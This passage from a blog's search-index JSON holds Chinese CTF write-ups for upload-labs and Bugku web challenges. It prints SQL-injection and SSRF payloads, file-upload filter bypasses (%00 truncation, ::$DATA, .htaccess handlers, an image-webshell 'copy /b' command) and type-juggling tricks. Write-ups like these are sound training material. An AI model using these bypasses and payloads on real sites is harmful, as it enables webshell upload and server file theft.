users),3,4 # 发现内容是注册时信息保存为序列化内容 O:8:”UserInfo”:3:{s:4:”name”;s:5:”sunzy”;s:3:”age”;i:22;s:4:”blog”;s:12:”22.github.io”;} 到这里就不知道怎么办了。。。 0x02审计源码扫描一下目录发现了robots.txt，其中给出来了源码备份文件的路径 源码 &lt;?php class UserInfo //user信息类 &#123; public $name = \"\"; public $age = 0; public $blog = \"\"; public function __construct($name, $age, $blog) &#123; $this-&gt;name = $name; $this-&gt;age = (int)$age; $this-&gt;blog = $blog; &#125; function get($url) // 处理url &#123; $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, $url); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); $output = curl_exec($ch); $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE); if($httpCode == 404) &#123; return 404; &#125; curl_close($ch); return $output; &#125; public function getBlogContents () &#123; return $this-&gt;get($this-&gt;blog); &#125; public function isValidBlog () &#123; $blog = $this-&gt;blog; return preg_match(\"/^(((http(s?))\\:\\/\\/)?)([0-9a-zA-Z\\-]+\\.)+[a-zA-Z]&#123;2,6&#125;(\\:[0-9]+)?(\\/\\S*)?$/i\", $blog); &#125; &#125; 审计源码发现其中get()函数存在SSRF(服务端请求伪造)漏洞。 思路：利用no参数进行注入，在反序列化中构造file文件协议，利用服务端请求伪造漏洞访问服务器上的flag.php文件。 ?no=-2%20union/**/select%201,2,3,'O:8:\"UserInfo\":3:&#123;s:4:\"name\";s:5:\"sunzy\";s:3:\"age\";i:22;s:4:\"blog\";s:29:\"file:///var/www/html/flag.php\";&#125;'%20# 查看源码，解base64。","tags":[{"name":"sql","slug":"sql","permalink":"https://sunzhengyu99.github.io/tags/sql/"},{"name":"unserailize","slug":"unserailize","permalink":"https://sunzhengyu99.github.io/tags/unserailize/"}]},{"title":"upload-11-21","date":"2020-09-18T13:58:51.000Z","path":"2020/09/18/upload2/","text":"upload-labs 11-21 pass11$is_upload = false; $msg = null; if (isset($_POST['submit'])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array(\"php\",\"php5\",\"php4\",\"php3\",\"php2\",\"html\",\"htm\",\"phtml\",\"pht\",\"jsp\",\"jspa\",\"jspx\",\"jsw\",\"jsv\",\"jspf\",\"jtml\",\"asp\",\"aspx\",\"asa\",\"asax\",\"ascx\",\"ashx\",\"asmx\",\"cer\",\"swf\",\"htaccess\",\"ini\"); $file_name = trim($_FILES['upload_file']['name']); $file_name = str_ireplace($deny_ext,\"\", $file_name); $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH.'/'.$file_name; if (move_uploaded_file($temp_file, $img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = '上传出错！'; &#125; &#125; else &#123; $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！'; &#125; &#125; $file_name = str_ireplace($deny_ext,&quot;&quot;, $file_name); 这段代码是将文件名中出现 deny_ext的后缀名替换为空 可以双写绕过，即1.pphphp pass12$is_upload = false; $msg = null; if(isset($_POST['submit']))&#123; $ext_arr = array('jpg','png','gif'); $file_ext = substr($_FILES['upload_file']['name'],strrpos($_FILES['upload_file']['name'],\".\")+1); if(in_array($file_ext,$ext_arr))&#123; $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = $_GET['save_path'].\"/\".rand(10, 99).date(\"YmdHis\").\".\".$file_ext; if(move_uploaded_file($temp_file,$img_path))&#123; $is_upload = true; &#125; else &#123; $msg = '上传出错！'; &#125; &#125; else&#123; $msg = \"只允许上传.jpg|.png|.gif类型文件！\"; &#125; &#125; 本题与之前的题目有所不同，这题的文件的保存路径是可以控制的 这里用的%00截断，原理如下 www.xxx.com/qq.jpg www.xxx.com/qq.php%00.jpg =&gt; www.xxx.com/qq.php其后缀名为.jpg可以绕过检测，但是windows系统处理时不会处理%00之后的内容故保存的文件就是qq.php pass13这题与上题利用的原理相同 但是这里要使用 00的二进制形式 pass14 明确说了上传图片木马 function getReailFileType($filename)&#123; $file = fopen($filename, \"rb\"); $bin = fread($file, 2); //只读2字节 fclose($file); $strInfo = @unpack(\"C2chars\", $bin); $typeCode = intval($strInfo['chars1'].$strInfo['chars2']); $fileType = ''; switch($typeCode)&#123; case 255216: $fileType = 'jpg'; break; case 13780: $fileType = 'png'; break; case 7173: $fileType = 'gif'; break; default: $fileType = 'unknown'; &#125; return $fileType; &#125; GIF89a 是GIF图片的文件头 ，是为了绕过gif文件的检查 图片木马的制作 桌面建立一个文本文件将其改为2.jpg，再建立一个改为1.php,其内容为你想添加的一句话木马 copy 2.jpg /b + 1.php /a webshell.jpg 未完待续。。。","tags":[{"name":"双写绕过","slug":"双写绕过","permalink":"https://sunzhengyu99.github.io/tags/%E5%8F%8C%E5%86%99%E7%BB%95%E8%BF%87/"},{"name":"00截断","slug":"00截断","permalink":"https://sunzhengyu99.github.io/tags/00%E6%88%AA%E6%96%AD/"}]},{"title":"uploads-labs","date":"2020-09-16T13:48:48.000Z","path":"2020/09/16/uploads/","text":"upload-labs 1-10 pass1直接抓包修改文件后缀名为jpg,png,gif即可 pass2查看源码 if (($_FILES['upload_file']['type'] == 'image/jpeg') || ($_FILES['upload_file']['type'] == 'image/png') || ($_FILES['upload_file']['type'] == 'image/gif')) 这段代码说明是对文件的MIME类型进行了过滤，直接上传 1.php 抓包后修改文件类型为 &#39;image/jpeg&#39; ,&#39;image/png&#39;,&#39;image/gif&#39;,这三个类型都为图片 知识点补充： MIME类型对大小写不敏感，但是传统写法都是小写。 text/plain text/html image/jpeg image/png audio/mpeg audio/ogg audio/* video/mp4 application/* application/json application/javascript application/ecmascript application/octet-stream 更详细的解释， pass3$deny_ext = array('.asp','.aspx','.php','.jsp'); 只禁止了.asp,.aspx,.php,.jsp后缀文件，可以使用php3,php5,php7,phtml等等后缀名绕过 pass4.htaccess文件的作用 URL重写、自定义错误页面 MIME类型配置 访问权限控制等 主要体现在伪静态的应用 图片防盗链 自定义404错误页面 阻止/允许特定IP/IP段 目录浏览与主页 禁止访问指定文件类型 文件密码保护 &lt;FilesMatch \"1.jpg\"&gt; SetHandler application/x-httpd-php &lt;/FilesMatch&gt; 这几句代码的意思： 通过.htaccess文件调用php解析器去解析一个文件名中只要包含”1.jpg”这个字符串的任意文件， 无论扩展名是什么(没有也行)，都以php的方式来解析 上传完.htaccess文件后直接上传一个 1.jpg即可 pass5$is_upload = false; $msg = null; if (isset($_POST['submit'])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array(\".php\",\".php5\",\".php4\",\".php3\",\".php2\",\".html\",\".htm\",\".phtml\",\".pht\",\".pHp\",\".pHp5\",\".pHp4\",\".pHp3\",\".pHp2\",\".Html\",\".Htm\",\".pHtml\",\".jsp\",\".jspa\",\".jspx\",\".jsw\",\".jsv\",\".jspf\",\".jtml\",\".jSp\",\".jSpx\",\".jSpa\",\".jSw\",\".jSv\",\".jSpf\",\".jHtml\",\".asp\",\".aspx\",\".asa\",\".asax\",\".ascx\",\".ashx\",\".asmx\",\".cer\",\".aSp\",\".aSpx\",\".aSa\",\".aSax\",\".aScx\",\".aShx\",\".aSmx\",\".cEr\",\".sWf\",\".swf\",\".htaccess\"); $file_name = trim($_FILES['upload_file']['name']); $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, '.'); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA $file_ext = trim($file_ext); //首尾去空 if (!in_array($file_ext, $deny_ext)) &#123; $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH.'/'.$file_name; if (move_uploaded_file($temp_file, $img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = '上传出错！'; &#125; &#125; else &#123; $msg = '此文件类型不允许上传！'; &#125; &#125; else &#123; $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！'; &#125; &#125; 本题与第十题完全一样，详细解答见第十题 pass6$is_upload = false; $msg = null; if (isset($_POST['submit'])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array(\".php\",\".php5\",\".php4\",\".php3\",\".php2\",\".html\",\".htm\",\".phtml\",\".pht\",\".pHp\",\".pHp5\",\".pHp4\",\".pHp3\",\".pHp2\",\".Html\",\".Htm\",\".pHtml\",\".jsp\",\".jspa\",\".jspx\",\".jsw\",\".jsv\",\".jspf\",\".jtml\",\".jSp\",\".jSpx\",\".jSpa\",\".jSw\",\".jSv\",\".jSpf\",\".jHtml\",\".asp\",\".aspx\",\".asa\",\".asax\",\".ascx\",\".ashx\",\".asmx\",\".cer\",\".aSp\",\".aSpx\",\".aSa\",\".aSax\",\".aScx\",\".aShx\",\".aSmx\",\".cEr\",\".sWf\",\".swf\",\".htaccess\",\".ini\"); $file_name = trim($_FILES['upload_file']['name']); $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, '.'); $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA $file_ext = trim($file_ext); //首尾去空 if (!in_array($file_ext, $deny_ext)) &#123; $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH.'/'.date(\"YmdHis\").rand(1000,9999).$file_ext; if (move_uploaded_file($temp_file, $img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = '上传出错！'; &#125; &#125; else &#123; $msg = '此文件类型不允许上传！'; &#125; &#125; else &#123; $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！'; &#125; &#125; 仔细查看源码会发现少了下面的这段代码 $file_ext = strtolower($file_ext); //转换为小写 这里就可以大小写绕过。将文件后缀名改为.pHp , .PHP等 pass7$is_upload = false; $msg = null; if (isset($_POST['submit'])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array(\".php\",\".php5\",\".php4\",\".php3\",\".php2\",\".html\",\".htm\",\".phtml\",\".pht\",\".pHp\",\".pHp5\",\".pHp4\",\".pHp3\",\".pHp2\",\".Html\",\".Htm\",\".pHtml\",\".jsp\",\".jspa\",\".jspx\",\".jsw\",\".jsv\",\".jspf\",\".jtml\",\".jSp\",\".jSpx\",\".jSpa\",\".jSw\",\".jSv\",\".jSpf\",\".jHtml\",\".asp\",\".aspx\",\".asa\",\".asax\",\".ascx\",\".ashx\",\".asmx\",\".cer\",\".aSp\",\".aSpx\",\".aSa\",\".aSax\",\".aScx\",\".aShx\",\".aSmx\",\".cEr\",\".sWf\",\".swf\",\".htaccess\",\".ini\"); $file_name = $_FILES['upload_file']['name']; $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, '.'); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA if (!in_array($file_ext, $deny_ext)) &#123; $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH.'/'.date(\"YmdHis\").rand(1000,9999).$file_ext; if (move_uploaded_file($temp_file,$img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = '上传出错！'; &#125; &#125; else &#123; $msg = '此文件不允许上传'; &#125; &#125; else &#123; $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！'; &#125; &#125; 跟第六关对比发现少了这句话 $file_ext = trim($file_ext); //首尾去空 利用Windows系统的文件名特性。文件名最后增加空格和点，写成1.php .，这个需要用burpsuite抓包修改，上传后保存在Windows系统上的文件名最后的一个.会被去掉，实际上保存的文件名就是1.php pass8$is_upload = false; $msg = null; if (isset($_POST['submit'])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array(\".php\",\".php5\",\".php4\",\".php3\",\".php2\",\".html\",\".htm\",\".phtml\",\".pht\",\".pHp\",\".pHp5\",\".pHp4\",\".pHp3\",\".pHp2\",\".Html\",\".Htm\",\".pHtml\",\".jsp\",\".jspa\",\".jspx\",\".jsw\",\".jsv\",\".jspf\",\".jtml\",\".jSp\",\".jSpx\",\".jSpa\",\".jSw\",\".jSv\",\".jSpf\",\".jHtml\",\".asp\",\".aspx\",\".asa\",\".asax\",\".ascx\",\".ashx\",\".asmx\",\".cer\",\".aSp\",\".aSpx\",\".aSa\",\".aSax\",\".aScx\",\".aShx\",\".aSmx\",\".cEr\",\".sWf\",\".swf\",\".htaccess\",\".ini\"); $file_name = trim($_FILES['upload_file']['name']); $file_ext = strrchr($file_name, '.'); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA $file_ext = trim($file_ext); //首尾去空 if (!in_array($file_ext, $deny_ext)) &#123; $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH.'/'.$file_name; if (move_uploaded_file($temp_file, $img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = '上传出错！'; &#125; &#125; else &#123; $msg = '此文件类型不允许上传！'; &#125; &#125; else &#123; $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！'; &#125; &#125; 这段代码少了这句话，可以与第六关相同的做法 $file_name = deldot($file_name);//删除文件名末尾的点 pass9$is_upload = false; $msg = null; if (isset($_POST['submit'])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array(\".php\",\".php5\",\".php4\",\".php3\",\".php2\",\".html\",\".htm\",\".phtml\",\".pht\",\".pHp\",\".pHp5\",\".pHp4\",\".pHp3\",\".pHp2\",\".Html\",\".Htm\",\".pHtml\",\".jsp\",\".jspa\",\".jspx\",\".jsw\",\".jsv\",\".jspf\",\".jtml\",\".jSp\",\".jSpx\",\".jSpa\",\".jSw\",\".jSv\",\".jSpf\",\".jHtml\",\".asp\",\".aspx\",\".asa\",\".asax\",\".ascx\",\".ashx\",\".asmx\",\".cer\",\".aSp\",\".aSpx\",\".aSa\",\".aSax\",\".aScx\",\".aShx\",\".aSmx\",\".cEr\",\".sWf\",\".swf\",\".htaccess\",\".ini\"); $file_name = trim($_FILES['upload_file']['name']); $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, '.'); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = trim($file_ext); //首尾去空 if (!in_array($file_ext, $deny_ext)) &#123; $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH.'/'.date(\"YmdHis\").rand(1000,9999).$file_ext; if (move_uploaded_file($temp_file, $img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = '上传出错！'; &#125; &#125; else &#123; $msg = '此文件类型不允许上传！'; &#125; &#125; else &#123; $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！'; &#125; &#125; 仔细观察发现少了这段代码 $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA 采用Windows文件流特性绕过 将文件名改为 1.php::$DATA,但是实质上保存的文件还是1.php pass10$is_upload = false; $msg = null; if (isset($_POST['submit'])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array(\".php\",\".php5\",\".php4\",\".php3\",\".php2\",\".html\",\".htm\",\".phtml\",\".pht\",\".pHp\",\".pHp5\",\".pHp4\",\".pHp3\",\".pHp2\",\".Html\",\".Htm\",\".pHtml\",\".jsp\",\".jspa\",\".jspx\",\".jsw\",\".jsv\",\".jspf\",\".jtml\",\".jSp\",\".jSpx\",\".jSpa\",\".jSw\",\".jSv\",\".jSpf\",\".jHtml\",\".asp\",\".aspx\",\".asa\",\".asax\",\".ascx\",\".ashx\",\".asmx\",\".cer\",\".aSp\",\".aSpx\",\".aSa\",\".aSax\",\".aScx\",\".aShx\",\".aSmx\",\".cEr\",\".sWf\",\".swf\",\".htaccess\",\".ini\"); $file_name = trim($_FILES['upload_file']['name']); $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, '.'); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA $file_ext = trim($file_ext); //首尾去空 if (!in_array($file_ext, $deny_ext)) &#123; $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH.'/'.$file_name; if (move_uploaded_file($temp_file, $img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = '上传出错！'; &#125; &#125; else &#123; $msg = '此文件类型不允许上传！'; &#125; &#125; else &#123; $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！'; &#125; &#125; 这一句代码是用来检测末尾是否是.，可以双写绕过。抓包将文件名改为1.php. . （注意两点之间有空格） 前面去掉.然后检验.不存在，再去空格，留下php.，然后php.不属于$deny_ext数组中存在的，当然就直接提交了。因为windows自动去点，于是php后缀就出来了","tags":[{"name":"MIME","slug":"MIME","permalink":"https://sunzhengyu99.github.io/tags/MIME/"},{"name":"大小写绕过","slug":"大小写绕过","permalink":"https://sunzhengyu99.github.io/tags/%E5%A4%A7%E5%B0%8F%E5%86%99%E7%BB%95%E8%BF%87/"},{"name":".htaccess","slug":"htaccess","permalink":"https://sunzhengyu99.github.io/tags/htaccess/"},{"name":"windows文件特性","slug":"windows文件特性","permalink":"https://sunzhengyu99.github.io/tags/windows%E6%96%87%E4%BB%B6%E7%89%B9%E6%80%A7/"}]},{"title":"bugku代码审计","date":"2020-09-14T13:01:01.000Z","path":"2020/09/14/decode/","text":"简单的代码审计 extract变量覆盖&lt;?php $flag='xxx'; //新建变量 extract($_GET); // 变量覆盖 if(isset($shiyan)) //判断是否存在 &#123; $content=trim(file_get_contents($flag));//把文件读入字符串 if($shiyan==$content) //判断两变量是否相等 &#123; echo'flag&#123;xxx&#125;'; &#125; else &#123; echo'Oh.no'; &#125; &#125; ?&gt; extract()函数 isset()函数isset() 函数用于检测变量是否已设置并且非 NULL。 如果已经使用 unset() 释放了一个变量之后，再通过 isset() 判断将返回 FALSE。 若使用 isset() 测试一个被设置成 NULL 的变量，将返回 FALSE。 同时要注意的是 null 字符（”\\0”）并不等同于 PHP 的 NULL 常量。 Tips:isset()函数如果一次传入多个参数，只有参数全被设置且非空的情况下才返回TRUE，isset()函数对数组中的元素同样适用。 file_get_contents() 变量覆盖的意思就是让自己上传的变量值覆盖原有的变量值 这里值得注意的是 $shiyan==$content,而content的值来自于函数自己建的$flag变量，所以这题目的变量覆盖实际是覆盖$flag的值，让flag的值和shiyan的值相同 可以用空值的方法使二者想等即 ?shiyan=&amp;flag= strcmp比较字符串http://123.206.87.240:9009/6.php &lt;?php $flag = \"flag&#123;xxxxx&#125;\"; if (isset($_GET['a'])) &#123; if (strcmp($_GET['a'], $flag) == 0) //如果 str1 小于 str2 返回 &lt; 0； 如果 str1大于 str2返回 &gt; 0；如果两者相等，返回 0。 //比较两个字符串（区分大小写） die('Flag: '.$flag); else print 'No'; &#125; ?&gt; 题目给的注释很清楚的给出了获得flag的条件。。。 先了解一下 strcmp()的两个参数都必须是字符串类型的，但是如果传递一个非字符穿类型的参数进去，例如数组，则函数就会报错，其返回值就为0。满足 if (strcmp($_GET[&#39;a&#39;], $flag) == 0) 即可获得flag url:http://123.206.87.240:9009/6.php?a[]= urldecode二次编码绕过题目说的很清楚了，二次编码绕过 if(eregi(\"hackerDJ\",$_GET[id])) &#123; echo(\" not allowed! \"); PHP 函数 eregi() 语法 int eregi(string pattern, string string, [array regs]); 定义和用法 eregi()函数在一个字符串搜索指定的模式的字符串。搜索不区分大小写。Eregi()可以特别有用的检查有效性字符串,如密码。 可选的输入参数规则包含一个数组的所有匹配表达式,他们被正则表达式的括号分组。 返回值 如果匹配成功返回true,否则,则返回false 这里进行了过滤，传的值不能为hackerDJ $_GET[id] = urldecode($_GET[id]); if($_GET[id] == \"hackerDJ\") //要编码的字符串hackerDJ GET会提交时进行一次urlencode urldecode()于urlencode()是一对想反作用的函数，一个解码一个编码。 $_GET[id] = urldecode($_GET[id]) urldecode后的$_GET[id] 复制给自己等于hackerDJ 所以对hackerDJ 进行两次urlencode, 为了绕过过滤；进行一次urldecode后其值和hackerDJ相等，得到flag ?id=%25%36%38%25%36%31%25%36%33%25%36%42%25%36%35%25%37%32%25%34%34%25%34%41 md5()函数之前写过 数组返回NULL绕过&lt;?php $flag = \"flag\"; if (isset ($_GET['password'])) &#123; if (ereg (\"^[a-zA-Z0-9]+$\", $_GET['password']) === FALSE) //进行过滤，password必须包含字母和数字 echo 'You password must be alphanumeric'; else if (strpos ($_GET['password'], '--') !== FALSE) die('Flag: ' . $flag); else echo 'Invalid password'; &#125; ?&gt; 提示是数组返回NULL 直接尝试提交?password[]=，flag就出来了 了解一下原理， 代码相关知识点链接如下： isset函数：http://php.net/manual/zh/function.isset.php ereg函数：http://www.php.net/manual/zh/function.ereg.php strpos函数：http://www.w3school.com.cn/php/func_string_strpos.asp “[A-Za-z0-9]”方括号表示字符集，[A-Za-z0-9]匹配大小写字母和数字其中一个字符 “^[A-Za-z0-9]$”^表示字符串开始，$表示字符串结束 ，这个匹配只有一个大小写字母和数字字符的字符串 “^[A-Za-z0-9]+$”+号表示重复1到多次，匹配由多个数字大小字母组成的字符串 值得注意的是这两个函数能处理的参数都是string类型 ereg只能处理字符，r如果数组，则返回的是null，三个等号的时候不会进行类型转换。所以null不等于false。 strpos的参数同样不能够是数组，所以返回的依旧是null，null不等于false也是正确。 故?password[]=可以绕过。 但是还有一种为%00截断 ?password=d%00--","tags":[{"name":"变量覆盖","slug":"变量覆盖","permalink":"https://sunzhengyu99.github.io/tags/%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96/"},{"name":"函数漏洞","slug":"函数漏洞","permalink":"https://sunzhengyu99.github.io/tags/%E5%87%BD%E6%95%B0%E6%BC%8F%E6%B4%9E/"},{"name":"绕过","slug":"绕过","permalink":"https://sunzhengyu99.github.io/tags/%E7%BB%95%E8%BF%87/"}]},{"title":"bugku刷题记录2","date":"2020-09-10T01:05:12.000Z","path":"2020/09/10/bugku1/","text":"bugku刷题记录2 速度要快打开页面查看源码什么也没有 抓包看了看，惊喜的发现了flag字段 一段base64 解码后为NDQyMDIy 提交发现并不对。。。看来另有玄机 多go几次后发现了flag值一直在变，并且有一段提示 &lt;!-- OK ,now you have to post the margin what you find --&gt; 用post方法提交你所发现的内容，只好使用脚本（不会写） import requests import base64 url=\"http://120.24.86.145:8002/web6/\" r=requests.session() headers=r.get(url).headers#因为flag在消息头里 mid=base64.b64decode(headers['flag']) mid=mid.decode()#为了下一步用split不报错，b64decode后操作的对象是byte类型的字符串，而split函数要用str类型的 flag = base64.b64decode(mid.split(':')[1])#获得flag:后的值 data=&#123;'margin':flag&#125; print (r.post(url,data).text)#post方法传上去 cookie欺骗注意观察urlhttp://123.206.87.240:8002/web11/index.php?line=2&amp;filename=a2V5cy50eHQ= line=2&amp;filename=a2V5cy50eHQ= a2V5cy50eHQ= 解密是为key.txt line是行的意思，这里应该是查看key.txt的第line行的代码 这里可以查看index.php源码 index.php的base64值为aW5kZXgucGhw 改变line的值可以一行一行的查看源码，可以使用脚本 import requests url1 = \"http://123.206.87.240:8002/web11/index.php?line=\" url2 = \"&amp;filename=aW5kZXgucGhw\" mysession = requests.session() for i in range(0, 40): r = mysession.get(url1+str(i)+url2) print(r.text) &lt;?php error_reporting(0); $file=base64_decode(isset($_GET['filename'])?$_GET['filename']:\"\"); $line=isset($_GET['line'])?intval($_GET['line']):0; if($file=='') header(\"location:index.php?line=&amp;filename=a2V5cy50eHQ=\"); $file_list = array( '0' =&gt;'keys.txt', '1' =&gt;'index.php', ); if(isset($_COOKIE['margin']) &amp;&amp; $_COOKIE['margin']=='margin')&#123; //看这里 $file_list[2]='keys.php'; &#125; if(in_array($file, $file_list))&#123; $fa = file($file); echo $fa[$line]; &#125; ?&gt; if(isset($_COOKIE[&#39;margin&#39;]) &amp;&amp; $_COOKIE[&#39;margin&#39;]==&#39;margin&#39;) 这里可以判断cookie必须满足margin=margin才能访问keys.php never give up查看源码提示了 &lt;!--1p.html--&gt; 直接访问1p.html,发现直接跳转到了bugku的主页，先看源码，发现一段编码应该是base64 JTIyJTNCaWYlMjglMjElMjRfR0VUJTVCJTI3aWQlMjclNUQlMjklMEElN0IlMEElMDloZWFkZXIlMjglMjdMb2NhdGlvbiUzQSUyMGhlbGxvLnBocCUzRmlkJTNEMSUyNyUyOSUzQiUwQSUwOWV4aXQlMjglMjklM0IlMEElN0QlMEElMjRpZCUzRCUyNF9HRVQlNUIlMjdpZCUyNyU1RCUzQiUwQSUyNGElM0QlMjRfR0VUJTVCJTI3YSUyNyU1RCUzQiUwQSUyNGIlM0QlMjRfR0VUJTVCJTI3YiUyNyU1RCUzQiUwQWlmJTI4c3RyaXBvcyUyOCUyNGElMkMlMjcuJTI3JTI5JTI5JTBBJTdCJTBBJTA5ZWNobyUyMCUyN25vJTIwbm8lMjBubyUyMG5vJTIwbm8lMjBubyUyMG5vJTI3JTNCJTBBJTA5cmV0dXJuJTIwJTNCJTBBJTdEJTBBJTI0ZGF0YSUyMCUzRCUyMEBmaWxlX2dldF9jb250ZW50cyUyOCUyNGElMkMlMjdyJTI3JTI5JTNCJTBBaWYlMjglMjRkYXRhJTNEJTNEJTIyYnVna3UlMjBpcyUyMGElMjBuaWNlJTIwcGxhdGVmb3JtJTIxJTIyJTIwYW5kJTIwJTI0aWQlM0QlM0QwJTIwYW5kJTIwc3RybGVuJTI4JTI0YiUyOSUzRTUlMjBhbmQlMjBlcmVnaSUyOCUyMjExMSUyMi5zdWJzdHIlMjglMjRiJTJDMCUyQzElMjklMkMlMjIxMTE0JTIyJTI5JTIwYW5kJTIwc3Vic3RyJTI4JTI0YiUyQzAlMkMxJTI5JTIxJTNENCUyOSUwQSU3QiUwQSUwOXJlcXVpcmUlMjglMjJmNGwyYTNnLnR4dCUyMiUyOSUzQiUwQSU3RCUwQWVsc2UlMEElN0IlMEElMDlwcmludCUyMCUyMm5ldmVyJTIwbmV2ZXIlMjBuZXZlciUyMGdpdmUlMjB1cCUyMCUyMSUyMSUyMSUyMiUzQiUwQSU3RCUwQSUwQSUwQSUzRiUzRQ base64解码后为url编码 ![never1](E:\\myblog\\szyblog\\source\\_posts\\bugku1\\never1.png)%22%3Bif%28%21%24_GET%5B%27id%27%5D%29%0A%7B%0A%09header%28%27Location%3A%20hello.php%3Fid%3D1%27%29%3B%0A%09exit%28%29%3B%0A%7D%0A%24id%3D%24_GET%5B%27id%27%5D%3B%0A%24a%3D%24_GET%5B%27a%27%5D%3B%0A%24b%3D%24_GET%5B%27b%27%5D%3B%0Aif%28stripos%28%24a%2C%27.%27%29%29%0A%7B%0A%09echo%20%27no%20no%20no%20no%20no%20no%20no%27%3B%0A%09return%20%3B%0A%7D%0A%24data%20%3D%20@file_get_contents%28%24a%2C%27r%27%29%3B%0Aif%28%24data%3D%3D%22bugku%20is%20a%20nice%20plateform%21%22%20and%20%24id%3D%3D0%20and%20strlen%28%24b%29%3E5%20and%20eregi%28%22111%22.substr%28%24b%2C0%2C1%29%2C%221114%22%29%20and%20substr%28%24b%2C0%2C1%29%21%3D4%29%0A%7B%0A%09require%28%22f4l2a3g.txt%22%29%3B%0A%7D%0Aelse%0A%7B%0A%09print%20%22never%20never%20never%20give%20up%20%21%21%21%22%3B%0A%7D%0A%0A%0A%3F%3E url解码为源码 &lt;?php f(!$_GET['id']) &#123; header('Location: hello.php?id=1'); exit(); &#125; $id=$_GET['id']; $a=$_GET['a']; $b=$_GET['b']; if(stripos($a,'.')) &#123; echo 'no no no no no no no'; return ; &#125; $data = @file_get_contents($a,'r'); if($data==\"bugku is a nice plateform!\" and $id==0 and strlen($b)&gt;5 and eregi(\"111\".substr($b,0,1),\"1114\") and substr($b,0,1)!=4) &#123; require(\"f4l2a3g.txt\"); //注意这里，flag应该藏在这里 &#125; else &#123; print \"never never never give up !!!\"; &#125; ?&gt; 果然藏在f4l2a3g.txt 正则？字符？ &lt;?php highlight_file('2.php'); $key='KEY&#123;********************************&#125;'; $IM= preg_match(\"/key.*key.&#123;4,7&#125;key:\\/.\\/(.*key)[a-z][[:punct:]]/i\", trim($_GET[\"id\"]), $match); if( $IM )&#123; die('key is: '.$key); &#125; preg_match(&quot;/key.*key.{4,7}key:\\/.\\/(.*key)[a-z][[:punct:]]/i&quot;, trim($_GET[&quot;id&quot;]), $match); 重点在这句话上，考点为正则表达式 定界符：/和/（一般来说是这两个，其实除了\\和字母数字其它的只要是成对出现都可以看做定界符，比如##、！！之类的）； . （一个点）：表示可以匹配任何字符； * ：前面的字符重复零次或多次； {n,m} ：前面的字符重复4~7次； \\ （反斜线）：后面的字符被转义； [a-z] ：在a到z中匹配 ； [[:punct:]] ：匹配任何标点符号； /i ：表示这个正则表达式对大小写不敏感； 因此可以写出符合要求的字符穿 keyakey22222key:/a/aaakeyb! 你从哪里来题目提示 are you from google? 你是从google来的吗 考察http头中的referer参数 Referer：浏览器向 WEB 服务器表明自己是从哪个 网页/URL 获得/点击 当前请求中的网址/URL。例如：Referer：http://www.sina.com/ 那么就抓包修改referer这个参数 Referer: https://www.google.com/,直接go即可 md5 collision这题是NCTF的一道题，原题是给了源码 本地访问见到题目就想到了x-forwarded-for，本地地址可以使用IP:127.0.0.1 可以使用google浏览器的插件 也可以直接使用bp抓包修改x-forwarded-for","tags":[{"name":"脚本","slug":"脚本","permalink":"https://sunzhengyu99.github.io/tags/%E8%84%9A%E6%9C%AC/"},{"name":"php","slug":"php","permalink":"https://sunzhengyu99.github.io/tags/php/"},{"name":"cookie","slug":"cookie","permalink":"https://sunzhengyu99.github.io/tags/cookie/"},{"name":"编码","slug":"编码","permalink":"https://sunzhengyu99.github.io/tags/%E7%BC%96%E7%A0%81/"}]},{"title":"bugku1-10","date":"2020-09-06T14:26:41.000Z","path":"2020/09/06/bugku1-10/","text":"bugku刷题记录1 web2查看源码即可 计算器修改前端代码 GETpayload: ?what=flag POST 矛盾payload: ?num=1a 考察点：弱类型比较 === 